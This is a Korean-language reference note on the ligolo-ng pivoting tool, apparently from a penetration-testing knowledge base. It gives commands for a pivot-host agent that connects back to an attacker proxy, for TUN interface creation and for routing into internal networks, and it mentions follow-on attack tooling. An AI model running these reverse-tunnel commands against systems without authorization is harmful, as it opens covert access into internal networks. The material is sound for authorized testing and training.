---
tags:
  - 기능/피벗
실행환경: ["Linux", "Windows"]
필요권한: ["공격 호스트 TUN 생성 권한", "피벗 호스트 agent 실행 권한"]
필요조건: ["agent를 실행할 수 있는 내부 호스트 접근"]
결과: ["네트워크 접근", "터널"]
---

# ligolo-ng

## 도구 개요

Ligolo-ng는 피벗 호스트의 에이전트와 공격 호스트의 TUN 인터페이스를 연결해 내부 대역을 로컬 경로처럼 다루게 하는 터널링 도구다. SOCKS를 개별 명령에 적용하지 않고 내부 TCP·UDP 주소에 직접 연결하는 라우팅형 피벗이 필요할 때 적합하다.

## 필요한 입력과 실행 환경

- 실행 위치: 공격 호스트의 `proxy`와 피벗 호스트의 `agent`
- 필요한 입력: agent가 연결할 proxy 주소/포트, 피벗 뒤 내부 대역, 생성할 TUN interface와 route
- 권한 조건: 공격 호스트의 TUN 생성 권한과 피벗 호스트의 agent 실행 권한
- 환경 조건: 양단 버전을 맞추고 인증서 방식과 reverse 연결 경로를 확인한다.
- `<PROXY_IP>`는 agent가 연결할 공격 host, `<INTERNAL_CIDR>`은 pivot 관점에서 도달 가능한 대역(예: `198.51.100.0/24`)이며 TUN interface와 route는 proxy host에 만든다. agent session 생성은 최종 내부 TCP 응답을 뜻하지 않는다.


## 표준 사용법

```bash
./proxy -selfcert
./agent -connect <PROXY_IP>:11601 -ignore-cert
```

### v0.6+ 관리형 TUN, route, tunnel 절차

```text
ligolo-ng » interface_create --name ligolo
ligolo-ng » interface_add_route --name ligolo --route <INTERNAL_CIDR>
ligolo-ng » session
[Agent : <AGENT>] » tunnel_start --tun ligolo
```

proxy 전역 프롬프트에서 interface와 route를 준비한 뒤 `session`으로 agent를 선택해 tunnel을 시작한다. route를 추가하기 전 agent의 `ifconfig`로 실제 내부 CIDR을 확인한다.

## 대표 예시

`<PROXY_IP>`는 agent가 연결할 공격 호스트 주소(예: `192.0.2.10`)이고, `<INTERNAL_CIDR>`은 agent `ifconfig`에서 얻은 피벗 뒤 CIDR이다. `<AGENT>`는 `session` 출력에 나타난 agent 식별자이며 route와 TUN은 proxy 호스트에서 만든 값을 재사용한다.

### 공격자 호스트에 TUN 인터페이스 준비

v0.6+에서는 proxy 콘솔의 `interface_create`를 우선 사용한다. 이전 릴리스 또는 관리형 interface 명령을 사용할 수 없는 환경에서는 Linux에서 수동으로 TUN을 만든다.

```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
```

### proxy listener 실행

```bash
./proxy -selfcert
```

### 피벗 호스트에서 agent 연결

```bash
./agent -connect <PROXY_IP>:11601 -ignore-cert
```

### route 추가과 터널 시작

```text
ligolo-ng » interface_add_route --name ligolo --route <INTERNAL_CIDR>
ligolo-ng » session
[Agent : <AGENT>] » tunnel_start --tun ligolo
```



## 주요 옵션

| 옵션 | 의미 | 자주 쓰는 상황 |
|---|---|---|
| `-h`, `--help` | 도움말 확인 | 지원 옵션과 모듈 확인 |

## 도구 고유 출력

| 출력/상태 | 의미 | 다음 행동 |
|---|---|---|
| `Agent joined` | agent가 proxy에 연결되어 session 선택 가능 | `session`으로 agent를 선택 |
| `Interface created!` | v0.6+ proxy가 지정한 TUN interface 생성 | 내부 CIDR에 route 추가 |
| `Route created.` | v0.6+ interface에 내부 route 추가 성공 | `tunnel_start --tun <NAME>` 실행 |
| `Starting tunnel` | 선택한 agent와 TUN 사이 데이터 경로가 시작됨 | `nc -vz`와 서비스 클라이언트로 최종 TCP 확인 |
| 내부 서비스 응답 확인 | 피벗 경로 정상 동작 | 서비스별 열거/공격 도구 실행 |
| route/permission 오류 | TUN, 관리자 권한, 라우팅 문제 | 인터페이스 권한, route, 방화벽 확인 |
| agent 연결 실패 | proxy 주소/포트 접근 불가 | reverse 경로, 방화벽, 인증서/포트 확인 |
| route 후 접근 불가 | 내부 대역 지정 오류 | 피벗 호스트의 라우팅 테이블, target network, ligolo route 확인 |
| 일부 포트만 실패 | 내부 방화벽 또는 서비스 비활성화 | 피벗 호스트 위치에서 접근 가능한 포트인지 확인 |

## 버전과 환경 차이

- Ligolo-ng v0.6+는 `interface_create`, `interface_add_route --name ... --route ...`, `tunnel_start --tun ...`로 interface와 route를 관리한다. 이 명령이 없다면 수동 `ip tuntap`과 `ip route add <INTERNAL_CIDR> dev <TUN>` 흐름을 쓴다.
- Windows proxy는 같은 폴더의 아키텍처에 맞는 `wintun.dll`이 필요하다. macOS는 기존 `utun[0-9]` interface 이름을 `tunnel_start --tun`에 지정한다.
- `-ignore-cert`는 실습 또는 디버깅에서만 쓴다. self-signed certificate를 쓸 때는 가능한 `certificate_fingerprint`와 agent의 `-accept-fingerprint`로 검증한다.

## 관련 공격기법

- [[TUN 라우팅 피벗 구성]]
- [[피벗팅 경로 식별과 내부망 열거]]

## 참고 링크

- [Ligolo-ng Quickstart](https://docs.ligolo.ng/Quickstart/)
